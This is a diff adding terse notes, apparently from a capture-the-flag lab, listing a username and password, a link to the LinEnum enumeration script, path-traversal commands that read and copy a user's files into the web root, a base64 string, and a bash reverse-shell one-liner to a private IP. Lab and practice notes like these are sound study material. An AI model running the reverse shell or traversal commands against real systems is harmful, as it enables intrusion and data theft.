@@ -1,0 +1,20 @@
+
+
+R1ckRul3s
+Wubbalubbadubdub
+
+https://github.com/rebootuser/LinEnum
+
+ls -al ../../../home/rick/
+ls -al ../../../home/rick/'second ingredients'
+file ../../../home/rick/'second ingredients'
+
+cp ../../../home/rick/'second ingredients' /var/www/html
+cp ../../../home/rick/prout /var/www/html/prout.txt
+ Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==
+ 
+ &>>
+
+bash -c "bash -i >& /dev/tcp/10.8.45.14/1234 0>&1"
+
+ls -al ../../../tmp
